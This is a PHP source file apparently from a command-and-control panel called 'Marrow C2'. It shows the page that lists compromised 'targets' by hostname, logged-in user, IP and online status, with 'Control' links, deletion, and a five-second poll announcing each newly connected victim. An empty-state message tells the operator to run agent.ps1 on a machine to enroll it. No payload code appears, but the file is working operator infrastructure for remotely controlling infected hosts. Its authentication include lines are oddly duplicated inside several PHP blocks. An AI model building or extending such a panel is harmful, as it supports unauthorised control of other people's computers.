<?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth();
// Marrow C2 - Targets List
require_once __DIR__ . '/../includes/Layout.php';
require_once __DIR__ . '/../includes/Target.php';

$targetModel = new Target();
$targets = $targetModel->getAll();

Layout::header('Targets');
?>

<div class="max-w-7xl mx-auto space-y-6">
    <div class="flex items-center justify-between">
        <div>
            <h1 class="text-2xl font-bold text-white">Target Management</h1>
            <p class="text-sm text-gray-500 mt-1"><?= count($targets) ?> total targets</p>
        </div>
        <div class="flex items-center gap-3">
            <input type="text" id="search" placeholder="Search..."
                class="bg-dark-700 border border-dark-500 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-primary w-64">
        </div>
    </div>

    <div class="bg-dark-700 border border-dark-500 rounded-2xl overflow-hidden">
        <table class="w-full">
            <thead class="bg-dark-600 border-b border-dark-500">
                <tr class="text-left text-xs text-gray-400 uppercase tracking-wider">
                    <th class="px-6 py-4">Status</th>
                    <th class="px-6 py-4">Target</th>
                    <th class="px-6 py-4">User</th>
                    <th class="px-6 py-4">IP Address</th>
                    <th class="px-6 py-4">Last Seen</th>
                    <th class="px-6 py-4">Actions</th>
                </tr>
            </thead>
            <tbody id="tbody" class="divide-y divide-dark-500">
                <?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth(); foreach ($targets as $t):
                    $online = $t['is_online'];
                    $name = $t['nickname'] ?: $t['hostname'] ?: $t['hwid'];
                    ?>
                    <tr class="hover:bg-dark-600 transition-colors target-row">
                        <td class="px-6 py-4">
                            <div class="flex items-center gap-2">
                                <div
                                    class="w-2.5 h-2.5 rounded-full <?= $online ? 'bg-accent animate-pulse' : 'bg-gray-600' ?>">
                                </div>
                                <span
                                    class="text-xs <?= $online ? 'text-accent' : 'text-gray-500' ?>"><?= $online ? 'ONLINE' : 'OFFLINE' ?></span>
                            </div>
                        </td>
                        <td class="px-6 py-4">
                            <div>
                                <div class="text-white font-medium"><?= htmlspecialchars($name) ?></div>
                                <div class="text-xs text-gray-500 font-mono"><?= htmlspecialchars($t['hwid']) ?></div>
                            </div>
                        </td>
                        <td class="px-6 py-4 text-gray-400 text-sm"><?= htmlspecialchars($t['user_context'] ?? '-') ?></td>
                        <td class="px-6 py-4 text-gray-500 font-mono text-sm">
                            <?= htmlspecialchars($t['ip_address'] ?? '-') ?>
                        </td>
                        <td class="px-6 py-4 text-gray-500 text-sm"><?= $t['seconds_ago'] ?>s ago</td>
                        <td class="px-6 py-4">
                            <div class="flex items-center gap-2">
                                <a href="/pages/target.php?id=<?= urlencode($t['hwid']) ?>"
                                    class="px-4 py-2 bg-primary/10 text-primary border border-primary/30 rounded-lg text-xs font-medium hover:bg-primary/20 transition-colors">
                                    Control →
                                </a>
                                <button onclick="deleteTarget('<?= htmlspecialchars($t['hwid']) ?>')"
                                    class="px-3 py-2 bg-danger/10 text-danger border border-danger/30 rounded-lg text-xs hover:bg-danger/20 transition-colors">
                                    🗑️
                                </button>
                            </div>
                        </td>
                    </tr>
                <?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth(); endforeach; ?>
                <?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth(); if (empty($targets)): ?>
                    <tr>
                        <td colspan="6" class="px-6 py-16 text-center text-gray-500">
                            No targets yet. Run agent.ps1 on a machine to connect.
                        </td>
                    </tr>
                <?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth(); endif; ?>
            </tbody>
        </table>
    </div>
</div>

<script>
    let lastCount = <?= count($targets) ?>;

    document.getElementById('search').addEventListener('input', (e) => {
        const q = e.target.value.toLowerCase();
        document.querySelectorAll('.target-row').forEach(row => {
            row.style.display = row.textContent.toLowerCase().includes(q) ? '' : 'none';
        });
    });

    async function deleteTarget(hwid) {
        if (!confirm('Delete this target and all its data?')) return;
        const fd = new FormData();
        fd.append('action', 'delete_target');
        fd.append('hwid', hwid);
        await fetch('/api/dashboard.php', { method: 'POST', body: fd });
        location.reload();
    }

    // Auto-refresh every 5 seconds for real-time updates
    async function checkNewTargets() {
        try {
            const fd = new FormData();
            fd.append('action', 'get_targets');
            const resp = await fetch('/api/dashboard.php', { method: 'POST', body: fd });
            const data = await resp.json();

            if (data && data.targets) {
                const newCount = data.targets.length;

                // If new target appeared, reload page
                if (newCount > lastCount) {
                    // Flash notification
                    document.body.insertAdjacentHTML('beforeend', `
                        <div id="new-target-toast" class="fixed top-4 right-4 bg-accent text-white px-4 py-3 rounded-xl shadow-lg z-50 animate-pulse">
                            🎯 New Target Connected!
                        </div>
                    `);
                    setTimeout(() => location.reload(), 1500);
                    return;
                }

                lastCount = newCount;
            }
        } catch (e) {
            console.log('Auto-refresh check failed', e);
        }
    }

    // Check for new targets every 5 seconds
    setInterval(checkNewTargets, 5000);
</script>

<?php
require_once __DIR__ . '/../includes/auth.php';
requireAuth(); Layout::footer(); ?>
